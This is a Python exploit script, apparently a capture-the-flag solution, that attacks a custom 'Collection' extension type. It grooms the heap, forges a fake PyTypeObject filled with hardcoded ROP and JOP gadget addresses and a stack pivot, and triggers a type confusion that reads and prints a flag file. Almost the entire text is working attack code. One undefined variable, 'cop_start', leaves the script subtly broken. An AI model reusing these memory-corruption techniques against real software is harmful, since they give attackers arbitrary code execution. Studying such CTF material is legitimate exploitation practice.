padd = Collection.Collection({"3":0x6161616161616161})
flagi = b"a" * 0x1000
dummy = Collection.Collection({"1":2})
rop_start =id(dummy) + 0x118 
vt=rop_start-0x128+5*8
readv_addr = 0x00000000004208b0
write_addr = 0x4207e0
read_len = 100
flagi_off = 0x20
PyTypeObject = {}
for i in range(0,32):
    if i == 0:
        PyTypeObject["%d" % i] =  0x420b11 #POP RDI;RET
        continue
    if i == 0x12:
        
        PyTypeObject["%d" % i] = 0x5e1a5c # mov rax, [rbp+8]; mov rax, [rax+128h]; mov rdx, [rbp+20h]; mov rsi, [rbp+18h]; mov rdi, rbp; call eax
        continue
    elif i == 1:
        PyTypeObject["%d" % i] = vt #RBP
        continue
    elif i == 2:
        PyTypeObject["%d" % i] = 0x420f6f #push rdi; jmp qword ptr [rsi + 0xf];
        continue
    elif i == 3:
        PyTypeObject["%d" % i] = rop_start-0xf+0x18+0x28 # rsi=rbp+18h=dest buff
        continue
    elif i == 4:
        PyTypeObject["%d" % i] = 0x1 # rdx=rbp+20h
        continue
    elif i == 5:
        PyTypeObject["%d" % i] = 0x426648 #pop rsp; ret 0x5a; 
        continue

    elif i == 12:
        PyTypeObject["%d" % i] = (rop_start+0x18+(19*8))*0x10000 #Used for stack_pivot
        continue

    elif i == 13:
        PyTypeObject["%d" % i] = 0x00 #padd
        continue
    elif i == 14: 
        PyTypeObject["%d" % i] = 0x00 #padd
        continue
#THIS IS THE IOVT: ptr,len
    elif i == 15:
        PyTypeObject["%d" % i] = id(flagi)+0x20 #pointer to the buffer
        continue
    elif i == 16: 
        PyTypeObject["%d" % i] = 0x30 # len
        continue
    elif i == 19:
        PyTypeObject["%d" % i] = 0x421612 #pop rdi; ret; 
        continue
    elif i == 20:
        PyTypeObject["%d" % i] = 1023 #fd
        continue    
    elif i == 21:
        PyTypeObject["%d" % i] = 0x42110e # pop rsi; ret; 
        continue
    elif i == 22:
        PyTypeObject["%d" % i] = cop_start+0x18+(15*8) #iovt pointer
        continue
    elif i == 23:
        PyTypeObject["%d" % i] = readv_addr #42110e
        continue

    elif i == 24:
        PyTypeObject["%d" % i] = 0x421612 #pop rdi
        continue    
    elif i == 25:
        PyTypeObject["%d" % i] = 0x1 #42110e
        continue
    elif i == 26:
        PyTypeObject["%d" % i] = 0x42110e #pop rsi
        continue
    elif i == 27:
        PyTypeObject["%d" % i] = id(flagi)+0x20 #42110e
        continue
    elif i == 28:
        PyTypeObject["%d" % i] = 0x4026c1 #pop rdx; ret;
        continue
    elif i == 29:
        PyTypeObject["%d" % i] = 0x100 #len
        continue
    elif i == 30:
        PyTypeObject["%d" % i] = write_addr 
        continue
    else:
        PyTypeObject["%d" % i] = 0x3030303000 + i #RBP
meta_obj = Collection.Collection(PyTypeObject)
rop_start2 =id(meta_obj)
assert rop_start2 == rop_start
x = {}
for i in range(34):
    if i == 32:
        x["%d" % (i)] = 0x2#id(meta_obj)
    elif i == 33:
        x["%d" % (i)] = id(meta_obj) + 0x18
    else:
        x["%d" % (i)] = 0xffffff00 + i

for i in range(2):
    del x["%d" % (i)]
avoid_gc = []
holes= []
consec_counter = 0
hole_idx = 0
length = 0
for i in range(5):
    temp = Collection.Collection({"1":4, "2":i})
    avoid_gc.append(temp)
    length += 1
    if length > 1:
        if id(temp) - 0x118 == id(avoid_gc[-2]):
            consec_counter += 1
        else:
            consec_counter = 0
    if consec_counter == 4 and hole_idx == 0:
        hole_idx = i
        hole_holder = temp
        consec_counter = 0
del avoid_gc[hole_idx-1]
a = Collection.Collection(x)
hole_holder.get("1")



